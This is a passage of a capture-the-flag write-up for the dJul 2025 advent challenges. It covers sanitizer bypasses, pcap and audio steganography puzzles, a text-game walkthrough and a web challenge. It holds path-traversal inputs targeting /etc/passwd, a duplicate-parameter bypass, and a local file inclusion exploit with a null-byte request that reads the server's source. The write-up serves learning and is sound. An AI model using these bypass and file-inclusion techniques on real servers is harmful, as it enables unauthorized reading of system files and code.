+using no-break spaces instead of regular space.</p></li><li><p>path_doo_doo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>path_doo_doo</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>removeAll</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>needles</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>needle</span> <span class=ow>in</span> <span class=n>needles</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>text</span> <span class=o>=</span> <span class=n>text</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>needle</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>text</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>path_parts</span> <span class=o>=</span> <span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># protect against path traversal</span>
+</span></span><span class=line><span class=cl>    <span class=n>path_parts</span> <span class=o>=</span> <span class=p>[</span><span class=n>removeAll</span><span class=p>(</span><span class=n>part</span><span class=p>,</span> <span class=p>[</span><span class=s2>&#34;..&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>])</span> <span class=k>for</span> <span class=n>part</span> <span class=ow>in</span> <span class=n>path_parts</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>path_parts</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>base</span> <span class=o>=</span> <span class=s2>&#34;/zeus/hera/perseus/&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_path</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>path</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;full_path&#34;</span><span class=p>,</span> <span class=n>full_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>normpath</span><span class=p>(</span><span class=n>full_path</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/etc/passwd&#34;</span>
+</span></span></code></pre></div><p>Similarly to the first one, we can input <code>.\\./.\\./.\\./etc/passwd</code>.</p></li><li><p>muh_keys_n_values</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>muh_keys_n_values</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_value</span><span class=p>(</span><span class=n>kvs</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span> <span class=ow>in</span> <span class=n>kvs</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=n>key</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>v</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_christmas_time</span><span class=p>(</span><span class=n>kvs</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>christmas_time</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span> <span class=ow>in</span> <span class=n>kvs</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=s2>&#34;christmas_time&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>christmas_time</span> <span class=o>=</span> <span class=n>v</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>christmas_time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>kvs</span> <span class=o>=</span> <span class=p>[</span><span class=n>param</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=p>)</span> <span class=k>for</span> <span class=n>param</span> <span class=ow>in</span> <span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;&amp;&#34;</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>get_value</span><span class=p>(</span><span class=n>kvs</span><span class=p>,</span> <span class=s2>&#34;christmas_time&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;YES! ho ho ho&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;It&#39;s not christmas yet! &gt;:(&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>get_christmas_time</span><span class=p>(</span><span class=n>kvs</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;YES! ho ho ho&#34;</span>
+</span></span></code></pre></div><p>The input <code>christmas_time=no&amp;christmas_time=YES! ho ho ho</code> will be parsed
+into</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=s2>&#34;christmas_time&#34;</span><span class=p>,</span> <span class=s2>&#34;no&#34;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=s2>&#34;christmas_time&#34;</span><span class=p>,</span> <span class=s2>&#34;YES! ho ho ho&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span></code></pre></div><p><code>get_value(...)</code> will return the first occurrence while
+<code>get_christmas_time(...)</code> will return the last occurrence.</p></li></ol><p>Completing all 7 sanitation bypasses reveals the solution to the challenge:
+<code>GYROS</code>.</p><h2 class="relative group">Window 16: Skis for two<div id=window-16-skis-for-two class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-16-skis-for-two aria-label=Anchor>#</a></span></h2><p>This challenge is in two parts and starts with a pcap file that somehow contains
+the password to the second part. Inspecting the pcap with
+<a href=https://www.wireshark.org/ target=_blank>wireshark</a> reveals that it holds some interesting
+TCP traffic. Most packets contain fields that read <code>IGNOREME</code> in the hexdump
+window (shown in the bottom left in the image below).</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Interesting TCP traffic" width=1021 height=533 src=/posts/djul-writeup-2025/img/window16_pcap_hu15481283408047674198.png srcset="/posts/djul-writeup-2025/img/window16_pcap_hu15481283408047674198.png 800w, /posts/djul-writeup-2025/img/window16_pcap.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window16_pcap.png></figure><p>With <a href=https://www.wireshark.org/docs/man-pages/tshark.html target=_blank>tshark</a> we can
+filter out these packets and extract the data fields we get the password for
+part 2.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> tshark -r data.pcap <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=go>    -Y &#39;tcp &amp;&amp; !frame contains &#34;IGNOREME&#34;&#39;  `# Filter` \
+</span></span></span><span class=line><span class=cl><span class=go>    -T fields -e data                       `# Extract data field` \
+</span></span></span><span class=line><span class=cl><span class=go>    | tr -d &#39;\n&#39;                            `# Concatenate` \
+</span></span></span><span class=line><span class=cl><span class=go>    | xxd -r -p                             `# Convert to ascii` \
+</span></span></span><span class=line><span class=cl><span class=go>    | sed &#39;s/OK$//&#39;                         `# Remove trailing &#39;OK&#39;` \
+</span></span></span><span class=line><span class=cl><span class=go>    | base64 -d                             `# Base64 decode`
+</span></span></span><span class=line><span class=cl><span class=go>th15_IS_n0t_bra1nr0t_i_ONLY_kn0w_BibleThump_aND_jerma985
+</span></span></span></code></pre></div><p>Part 2 has the following instruction file, paired with an audio file
+<code>jingle.ogg</code>.</p><pre tabindex=0><code>Part 2/2
+jingle.ogg is your part 2 challenge; can you figure out what it is encoding?
+
+some information necessary to solve:
+
+Key: A minor, A₀B₁C₂D₃E₄F₅G₆a₇
+Title: __i_____
+Encoding Hint: E₄ + C₂ = i (Base64)
+(Note that this is the roughly the same info as the metadata of the jingle.ogg file.)
+</code></pre><p>I brought out my guitar and figured out that the jingle plays the notes E4 E4 E4
+A4 E4 C4 D4 A4 D4 G4 E4 D4 A3 A3 G4 A3. In the notation of the instructions this
+would be E₄ E₄ E₄ a₇ E₄ C₂ D₃ a₇ D₃ G₆ E₄ D₃ A₀ A₀ G₆ A₀.</p><p>From the instructions we expect the title to be 7 characters long with the
+letter &lsquo;i&rsquo; at position 3. There is a total of 14 notes and note 5 and 6 aligns
+with the encoding hint for the third character, so it seems like we should take
+two notes at a time and encode them according to the hint.</p><p>We can observe that the subscripts in the hint, 4 and 2, written in binary is
+100 010, which in Base64 is &lsquo;i&rsquo;. If we do this for the rest of the note pairs we
+get the Base64 string &ldquo;knifejAw&rdquo; and the sought challenge solution <code>KNIFEJAW</code>.</p><h2 class="relative group">Window 17: Weak floors and unsanitary bottles<div id=window-17-weak-floors-and-unsanitary-bottles class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-17-weak-floors-and-unsanitary-bottles aria-label=Anchor>#</a></span></h2><blockquote><p>I realize I did not take any notes when solving this challenge and I do not
+remember enough of it to write anything of substance here. As the
+challenge-specific website is no longer available I cannot redo it for the
+sake of completing the write-up either. What I <strong>can</strong> remember is that
+someone had given the feedback that dJul had too little brainrot in it. The
+dJul creators showed that they take feedback veeery seriously by making the UI
+of this challenge one of the most god-awful things I have ever seen (: Cudos
+to the dJul team for that!</p></blockquote><blockquote><p><strong>Note to self:</strong> Take more notes.</p></blockquote><h2 class="relative group">Window 18: Am I fighting the duck?<div id=window-18-am-i-fighting-the-duck class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-18-am-i-fighting-the-duck aria-label=Anchor>#</a></span></h2><p>In this challenge you are given an mp3 file and a python script <code>phase.py</code> that
+can encode data into audio files and decode such hidden data, along with simple
+instructions on how to use it.</p><p>The script is made for wav files, so we first convert the mp3 to wav with
+<code>ffmpeg -i track.mp3 track.wav</code>. Running the decoder finds the data</p><pre tabindex=0><code>|=//=THIS=IS=NOT=THE=HIDDEN=MESSAGE|THIS=IS=NOT=THE=HIDEN=MESSAGE=//=|
+|=//=THIS=IS=NO=THE=HI�DEN=LESWAGE|THIS=IS=NOT=THM=HIDTEN=MESSAGE=//=�
+|#####################################################################|
+|~~~~~|~~~^~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~t
+|~~~~~|~16KH�~~~~~~~~~PECTRUM?~~~~~~~~~WHERE?~FREQ?~TIME?~~~~~~~~~~~~|
+|~~~~~~~~~~~~~~~~~~~~~~SPECTRUM�~~~~~~~~~~~~~~~~~~~~~~~16KHZ~~^~~~~~~~|
+|~~~CHANNEL?~~~~~~~~~~SPECTRUM?n~~~v~~~~~~~~~~~~~SPECTRUM?~~~~~~~~~~|
+|~~~~~GOOD_LUCK~~~IT_IS_3600_|THREE^THOUSAND_SIX_HUNDRED|_CYTES_LONG~~|
+|~~~~~~~n16KHZ~~~~~~~~NOISYN_ISYNOISYNOISY~v~~SPECTRUM?~~~~~~~~~~~~~~~|
+|~~~~~~~~~~~~~~~~~~~~~~~~~v~~~~~16Z~~~~~~~~~~~~~~~~~~~~~GOOD_LUCK~~~|
+|~~~~IT_IS_3600_|THREE_THOUSA�D_SIX_HUNDVED|_BYTES_LONG~~n~~~~~~~~v&gt;~~|
+|~~~~~~SRECTRUM?~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~16KXZ~~~~~CHINNEL?~~~~|
+|~~~~~~~~~~~~~~~~~~YOW_CANNOTOGO_BACK_IN_TIME~~~~~~~~~~&gt;CHANNEL?~~~~~~|
+|~~~~GOOD_L�SKz~~v~~~~~ONLY_FORWARD~~~~~~�~~~~~~~~~~~~~~~~~~~~~n~~~~~~|
+|~�~~~~~~~~~~~~16KHZ~~~~~~~~v~~~~~~~~~~~~~WHERE?~FREQ?~TIME?~~�~~~~n~~||~~~~~~~~~IT_IS_3600_|THREE_THO]SAND_SIX_HUNDRED8_BYTES_�ONG~~~~~~~~~~|
+|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+|##################################################�+################|
+|=//}TXIS=IS&lt;ZKTTHE=HIDDEN=MESSAG�|THis=IQ=NOT=THE=HIDDEN=MESSAGE=//=|
+|=//=THIS=IS?NOT=THE=XIDDEN=MESSAGE|THIS=IS=nOT=THE=HIDDEN=MESSAGE�//=|
+</code></pre><p>Since the audio had had a lossy mp3 conversion we get the expectedly noisy
+decoded data, but it is still readable. We can read &ldquo;3600 bytes long&rdquo;,
+&ldquo;channel?&rdquo;, &ldquo;16kHz&rdquo;, &ldquo;spectrum?&rdquo;, &ldquo;time?&rdquo;.</p><p>Here I examined <code>phase.py</code> more thoroughly. It encodes the data in the left
+channel, at the beginning of the audio file at around 14500 Hz. The &ldquo;channel?&rdquo;
+and &ldquo;16kHz&rdquo; comments seem to hint at considering to look for data elsewhere.</p><p>The story several times tells you to visualize things. Here&rsquo;s the spectrogram of
+the audio file (left channel on top, right on bottom):</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Spectrogram of track.mp3&rsquo;s channels" width=912 height=546 src=/posts/djul-writeup-2025/img/window18_spectrogram_hu2047944529717913622.png srcset="/posts/djul-writeup-2025/img/window18_spectrogram_hu2047944529717913622.png 800w, /posts/djul-writeup-2025/img/window18_spectrogram.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window18_spectrogram.png></figure><p>Focusing on the left channel first, there seems to be a block of some data at
+the beginning and we can confirm that it indeed is located at around 14500 Hz.
+So this must be the data that we decoded earlier. In the right channel however,
+there appears to be a similar block of encoded data at the end of the track.
+This one is instead around 16000 Hz, matching the earlier hint. The block also
+appears to be &ldquo;stretched&rdquo; compared to the one in the left channel, it is about
+twice as long in time.</p><p>So we know that there is something in the right channel, at 16 kHz, aligned with
+the end of the track, and twice as wide as the data in the left channel.</p><p>We can decode this data block by modifying <code>phase.py</code> to reflect this. Only
+three lines have to be changed:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> diff phase.py unphase.py
+</span></span><span class=line><span class=cl><span class=go>39c39
+</span></span></span><span class=line><span class=cl><span class=go>&lt;  mod_size = len(data) // 4
+</span></span></span><span class=line><span class=cl><span class=go>---
+</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>  <span class=nv>mod_size</span> <span class=o>=</span> len<span class=o>(</span>data<span class=o>)</span> // <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=go>43c43
+</span></span></span><span class=line><span class=cl><span class=go>&lt;  cutoff_ratio = (freq_max - 14500) / freq_max
+</span></span></span><span class=line><span class=cl><span class=go>---
+</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>  <span class=nv>cutoff_ratio</span> <span class=o>=</span> <span class=o>(</span>freq_max - 16000<span class=o>)</span> / freq_max
+</span></span><span class=line><span class=cl><span class=go>46c46
+</span></span></span><span class=line><span class=cl><span class=go>&lt;  secret_phases = np.angle(np.fft.fft(data[:mod_size, 0]))[center - secret_size * 8 - shiftdown : center - shiftdown]
+</span></span></span><span class=line><span class=cl><span class=go>---
+</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>  <span class=nv>secret_phases</span> <span class=o>=</span> np.angle<span class=o>(</span>np.fft.fft<span class=o>(</span>data<span class=o>[</span>-mod_size:, 1<span class=o>]))[</span>center - secret_size * <span class=m>8</span> - shiftdown : center - shiftdown<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=go>58c58
+</span></span></span></code></pre></div><p>With this we can decode the secret hidden message and the solution to the
+challenge, <code>EUPHONIA</code>.</p><h2 class="relative group">Window 19: Substitute Santa<div id=window-19-substitute-santa class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-19-substitute-santa aria-label=Anchor>#</a></span></h2><p>Last MUD of the year! You are dropped in a tiny town:</p><pre tabindex=0><code>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+X                             XXX                                         X
+X                            X   X                                        X
+X                           X     X                                       X
+X                          XXXXXXXXX                                      X
+X                          X Timmy X                                      X
+X                          X       X     XXXXXXXXXXXXXXX                  X
+X                          X       X     X   School    XXXXXX             X
+X                          XXXXXXXXX     X             X    X             X
+X                                        X             X    X             X
+X                           XXXXXXX      XXXXXXXXXXXXXXXXXXXX             X
+X    XXXXXXXXXXXXXXXXX   XXX▒▒▒▒▒▒▒XXX          XXXXXXXXXXXXXXXX          X
+X    X   $ Store $   X  X▒▒▒▒▒XXX▒▒▒▒▒X         X   Library    X          X
+X    X               X  X▒▒▒▒X   X▒▒▒▒X         X              X          X
+X    X               X  X▒▒▒▒▒XXX▒▒▒▒▒X         X              X          X
+X    XXXXXXXXXXXXXXXXX   XXX▒▒▒▒▒▒▒XXX          XXXXXXXXXXXXXXXX          X
+X                       X   XXXXXXX    X      X                           X
+X                     XX   X          XXX    X X       XXX  X             X
+X      XXXXXXXXXXXXXXX    X  X XX    XX XX  XX XX      X  XX              X
+X      X     Alley      XX    X X  XXXXXXXXXXXXXXXXXX  X                  X
+X      XXXXXXXXXXXXXXXXX        X  X   Carnival     X  X                  X
+X                               X  X                X  X                  X
+X                               X  XXXXXXXXXXXXXXXXXX  X                  X
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</code></pre><p>After exploring a bit it is clear that this challenge is a typical
+substitution/trading game, where you start with $100 with the goal of acquiring
+enough of the presents Timmy wants for Christmas. You get his wishlist by
+interacting with him in his house.</p><pre tabindex=0><code>This is my wishlist, ordered by how much i want each item
+snowball machine : 30
+snowmobile : 30
+santa poster : 25
+ice skates : 20
+booster pack : 10
+sticker (red): 2
+sticker (plain): 1
+</code></pre><p>Since there are quite a lot of different options for what and who to interact
+with (and different ways of acquiring the same items) I will limit this to a
+simple walkthrough of what I did and leave out the _why_s. It was mostly just a
+matter of trial and error and trying to exhaust all possibilities to try to get
+as high of a score as possible.</p><p>First, I went to the alley and bought an emp ($40) and jolly usb-stick ($25),
+and to the store and bought a red marker ($10). Next, I went to the carnival and
+got sticker (plain) by loosing the rigged lottery wheel game ($10). Combining
+the sticker (plain) and red marker gave me a sticker (red), which I gave to the
+carnival nerd at the library for a carnival themed booster pack. I used the
+jolly usb-stick on the library printer giving me a santa poster (monochrome)
+($5) which was combined with the red marker to make a regular santa poster.
+Next, using the emp at the playground CCTV cameras disabled them and let me
+steal the snowball machine. Lastly, I went back to the carnival for another
+plain sticker ($10) which I again combined with the red marker for a sticker
+(red).</p><p>Jimmy was happy with these items (jolly usb-stick, red marker, booster pack,
+santa poster, snowball machine, sticker (red)), revealing the sought solution
+<code>FUGACIOUS</code>.</p><h2 class="relative group">Window 22: On victory, emit gg<div id=window-22-on-victory-emit-gg class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-22-on-victory-emit-gg aria-label=Anchor>#</a></span></h2><p>This challenge presents you with a Clash Royale type game on the website
+<a href=http://clash.djul.se:2167 target=_blank>http://clash.djul.se:2167</a>. To complete the challenge you have to win the
+&rsquo;extreme&rsquo; level bot, which is not even made available to play against.</p><p>The story contains two major hints. Firstly, dAnkan says that we should &ldquo;<em>make
+the system believe we are playing against the extreme bot [&mldr;]. Let something
+else take its place.</em>&rdquo; Secondly, dAnkan suggest we try to break the website and
+inspect the resulting errors.</p><p>Running <a href=https://www.kali.org/tools/dirbuster/ target=_blank>DirBuster</a> on the website
+reveals a
+<a href=https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion target=_blank>local file inclusion</a>
+vulnerability on the <code>/public?path=</code> page, as it seems to accept absolute paths
+to arbitrary files. While it blocks path traversals with <code>..</code>, we might be able
+to get our hands on the server-side code if we knew the full path to it.</p><p>Some invalid paths happen to result in errors, such as a simple null termination
+<code>/public?path=%00</code>:</p><pre tabindex=0><code>TypeError [ERR_INVALID_ARG_VALUE]: The argument &#39;path&#39; must be a string, Uint8Array, or URL without null bytes. Received &#39;/clashroyaleapp/public/\x00&#39;
+    at Object.access (node:fs:225:10)
+    at /clashroyaleapp/index.js:589:6
+    at Layer.handleRequest (/clashroyaleapp/node_modules/router/lib/layer.js:152:17)
+    at next (/clashroyaleapp/node_modules/router/lib/route.js:157:13)
+    at Route.dispatch (/clashroyaleapp/node_modules/router/lib/route.js:117:3)
+    at handle (/clashroyaleapp/node_modules/router/index.js:435:11)
+    at Layer.handleRequest (/clashroyaleapp/node_modules/router/lib/layer.js:152:17)
+    at /clashroyaleapp/node_modules/router/index.js:295:15
+    at processParams (/clashroyaleapp/node_modules/router/index.js:582:12)
+    at next (/clashroyaleapp/node_modules/router/index.js:291:5)
+</code></pre><p>The error shows the path of the code script from where the error originated,
+<code>/clashroyaleapp/index.js</code>, which likely is the server-side code that we are
+interested in to understand the internal game logic. We get this code by
+visiting <a href="http://clash.djul.se:2167/public?path=%2Fclashroyaleapp%2Findex.js" target=_blank>http://clash.djul.se:2167/public?path=%2Fclashroyaleapp%2Findex.js</a>.</p><p>There are two main challenges to overcome here: find out how to start a game
+against the extreme bot, and find a way to win such a game.</p><p>Starting with the former, this is the code that sets the bot difficulty
+depending on the payload the client sends the server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;host-game&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>payload</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>socket</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>lobbyCode</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>destroyLobby</span><span class=p>(</span><span class=nx>socket</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>lobbyCode</span><span class=p>,</span> <span class=s2>&#34;Host left lobby&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>code</span> <span class=o>=</span> <span class=nx>generateLobbyCode</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>lobby</span> <span class=o>=</span> <span class=nx>createLobby</span><span class=p>(</span><span class=nx>code</span><span class=p>,</span> <span class=nx>socket</span><span class=p>.</span><span class=nx>id</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>lobbies</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>code</span><span class=p>,</span> <span class=nx>lobby</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>lobbyCode</span> <span class=o>=</span> <span class=nx>code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>team</span> <span class=o>=</span> <span class=s2>&#34;blue&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>lobby</span><span class=p>.</span><span class=nx>room</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>bots</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>alice</span><span class=o>:</span> <span class=p>{</span> <span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;easy&#34;</span> <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=nx>bob</span><span class=o>:</span> <span class=p>{</span> <span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;medium&#34;</span> <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=nx>eve</span><span class=o>:</span> <span class=p>{</span> <span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;hard&#34;</span> <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// santa: { mode: &#34;extreme&#34; } Disabled because too hard to beat
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>botMode</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>payload</span> <span class=o>&amp;&amp;</span> <span class=nx>payload</span><span class=p>.</span><span class=nx>botName</span> <span class=o>&amp;&amp;</span> <span class=nx>payload</span><span class=p>.</span><span class=nx>botName</span> <span class=k>in</span> <span class=nx>bots</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>botMode</span> <span class=o>=</span> <span class=nx>bots</span><span class=p>[</span><span class=nx>payload</span><span class=p>.</span><span class=nx>botName</span><span class=p>].</span><span class=nx>mode</span> <span class=o>||</span> <span class=s2>&#34;extreme&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>botMode</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>botSocketId</span> <span class=o>=</span> <span class=sb>`bot-</span><span class=si>${</span><span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>lobby</span><span class=p>.</span><span class=nx>players</span><span class=p>[</span><span class=nx>botSocketId</span><span class=p>]</span> <span class=o>=</span> <span class=nx>initializePlayerState</span><span class=p>(</span><span class=nx>botSocketId</span><span class=p>,</span> <span class=s2>&#34;red&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>isBot</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=nx>lobby</span><span class=p>.</span><span class=nx>bot</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>id</span><span class=o>:</span> <span class=nx>botSocketId</span><span class=p>,</span> <span class=nx>mode</span><span class=o>:</span> <span class=nx>botMode</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>lobbyCode</span> <span class=o>=</span> <span class=nx>code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>team</span> <span class=o>=</span> <span class=s2>&#34;blue&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>io</span><span class=p>.</span><span class=nx>to</span><span class=p>(</span><span class=nx>lobby</span><span class=p>.</span><span class=nx>room</span><span class=p>).</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;lobby-joined&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>code</span> <span class=p>});</span>
